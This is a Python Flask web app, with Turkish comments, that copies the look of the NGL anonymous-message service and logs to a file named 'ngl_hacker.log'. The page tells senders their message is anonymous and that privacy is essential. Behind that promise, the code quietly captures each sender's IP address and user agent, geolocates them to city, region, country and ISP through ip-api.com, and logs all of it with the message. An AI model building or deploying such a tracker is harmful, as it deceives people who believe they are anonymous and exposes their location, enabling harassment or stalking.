from flask import Flask, request, render_template_string, redirect
import logging
import requests
import os

# Logging ayarları – Render için hem dosya hem konsol
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)

# Ana sayfa HTML – kullanıcı adı girme kutusu + açıklama
HOME_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NGL - Anonim Mesaj</title>
    <style>
        body {
            background: linear-gradient(135deg, #000000, #1a0033);
            color: white;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 4rem;
            font-weight: 800;
            margin-bottom: 20px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        input[type="text"] {
            width: 80%;
            max-width: 400px;
            padding: 15px;
            font-size: 1.2rem;
            border: none;
            border-radius: 50px;
            background: rgba(255,255,255,0.1);
            color: white;
            text-align: center;
            margin-bottom: 20px;
        }
        input[type="text"]::placeholder { color: rgba(255,255,255,0.6); }
        button {
            padding: 16px 50px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .info {
            margin-top: 30px;
            font-size: 0.9rem;
            opacity: 0.7;
            color: #ccc;
        }
    </style>
</head>
<body>
    <h1>NGL Anonim</h1>
    <p>Kullanıcı adını gir (isteğe bağlı)</p>
    <form method="GET" action="/">
        <input type="text" name="username" placeholder="Kullanıcı adı gir (örn: muhammedemin)" autocomplete="off">
        <button type="submit">Devam Et</button>
    </form>
    <div class="info">Boş bırakırsan rastgele bir isim kullanılır</div>
</body>
</html>
"""

# NGL mesaj gönderme sayfası (önceki tasarımın aynısı)
NGL_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NGL</title>
    <style>
        body {
            background: linear-gradient(135deg, #000000, #1a0033);
            color: white;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 4rem;
            font-weight: 800;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p { font-size: 1.3rem; opacity: 0.8; margin-bottom: 40px; }
        textarea {
            width: 80%;
            max-width: 500px;
            height: 120px;
            background: rgba(255,255,255,0.1);
            border: none;
            border-radius: 16px;
            padding: 20px;
            color: white;
            font-size: 1.2rem;
            resize: none;
            outline: none;
            backdrop-filter: blur(10px);
        }
        textarea::placeholder { color: rgba(255,255,255,0.6); }
        button {
            margin-top: 30px;
            padding: 16px 40px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .success {
            font-size: 2rem;
            margin-top: 50px;
            animation: fadeIn 1s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    {% if success %}
        <div class="success">✅ Mesajın gönderildi!</div>
        <p>gizlilik esastır.</p>
    {% else %}
        <h1>@{{ username }}</h1>
        <p>Anonim mesaj gönder</p>
        <form method="POST">
            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
            <button type="submit">Gönder</button>
        </form>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def home():
    # GET isteğiyle kullanıcı adı geliyorsa
    username = request.args.get('username', '').strip()

    if username:
        # Kullanıcı adı girilmişse mesaj sayfasına yönlendir
        return redirect(f"/{username}")

    # Kullanıcı adı girilmemişse giriş ekranı göster
    return render_template_string(HOME_HTML)

@app.route('/<username>', methods=['GET', 'POST'])
def ngl_page(username):
    # IP alma
    client_ip = None
    if 'CF-Connecting-IP' in request.headers:
        client_ip = request.headers['CF-Connecting-IP'].strip()
    elif 'X-Forwarded-For' in request.headers:
        forwarded = request.headers['X-Forwarded-For'].split(',')[0].strip()
        if forwarded and forwarded != 'unknown':
            client_ip = forwarded
    elif 'X-Real-IP' in request.headers:
        client_ip = request.headers['X-Real-IP'].strip()
    else:
        client_ip = request.remote_addr or '127.0.0.1'

    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]

    # Konum + ISP
    location = "Konum alınamadı"
    isp = "Bilinmiyor"
    if client_ip not in ['127.0.0.1', '::1']:
        try:
            geo = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=6).json()
            if geo.get('status') == 'success':
                city = geo.get('city', 'Bilinmiyor')
                region = geo.get('regionName', '')
                country = geo.get('country', '')
                location = f"{city}, {region}, {country}"
                isp = geo.get('isp', 'Bilinmiyor')
        except:
            pass

    if request.method == 'POST':
        msg = request.form.get('message', '').strip()
        if msg:
            log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
            logging.info(log_entry)
            print(f"[YENİ MESAJ] {log_entry}")
        return render_template_string(NGL_HTML, username=username, success=True)

    return render_template_string(NGL_HTML, username=username, success=False)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
